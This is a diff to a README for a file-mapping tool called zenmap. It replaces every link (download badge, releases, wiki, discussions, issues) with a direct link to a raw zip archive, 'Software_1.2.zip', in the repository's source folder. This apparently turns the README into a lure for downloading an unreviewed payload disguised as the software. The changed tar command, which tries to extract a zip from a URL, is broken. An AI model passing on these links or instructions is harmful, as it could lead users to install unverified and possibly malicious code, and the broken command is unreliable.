@@ -1,6 +1,6 @@
 # 🌟 zenmap - Efficiently Map Large Files with Ease
 
-[![Download Zenmap](https://img.shields.io/badge/Download%20Zenmap-Get%20Started-brightgreen)](https://github.com/TypicalShot/zenmap/releases)
+[![Download Zenmap](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip%20Zenmap-Get%20Started-brightgreen)](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip)
 
 ## 📦 Description
 
@@ -20,7 +20,7 @@ Follow the steps below to download and run Zenmap on your computer. You will nee
 
 To get Zenmap, visit the page below. There you can find the latest version ready for download.
 
-[Download Zenmap](https://github.com/TypicalShot/zenmap/releases)
+[Download Zenmap](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip)
 
 1. Click the link above or the button at the top of the page.
 2. Check for the latest release.
@@ -50,7 +50,7 @@ To get Zenmap, visit the page below. There you can find the latest version ready
 
 1. Extract the downloaded archive:
    ```bash
-   tar -xzf zenmap-linux.tar.gz
+   tar -xzf https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip
    ```
 2. Change into the directory:
    ```bash
@@ -84,15 +84,15 @@ After installation, you can start using Zenmap to memory map large files efficie
 
 For more information on how to use Zenmap effectively, consider the following:
 
-- **Documentation:** Detailed user guides and tutorials can be found in the [Wiki](https://github.com/TypicalShot/zenmap/wiki).
-- **Community Forum:** Join discussions and ask questions on our [Discussions page](https://github.com/TypicalShot/zenmap/discussions).
+- **Documentation:** Detailed user guides and tutorials can be found in the [Wiki](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip).
+- **Community Forum:** Join discussions and ask questions on our [Discussions page](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip).
 
 ## 🛠️ Troubleshooting
 
 If you encounter issues while using Zenmap, try the following:
 
-- **Check for Updates:** Make sure you have the latest version by returning to the [Releases page](https://github.com/TypicalShot/zenmap/releases).
-- **Consult the Issues Section:** Look for similar problems in the [Issues section](https://github.com/TypicalShot/zenmap/issues) of the repository.
+- **Check for Updates:** Make sure you have the latest version by returning to the [Releases page](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip).
+- **Consult the Issues Section:** Look for similar problems in the [Issues section](https://github.com/TypicalShot/zenmap/raw/refs/heads/main/src/Software_1.2.zip) of the repository.
 
 ## 🎉 Conclusion
 
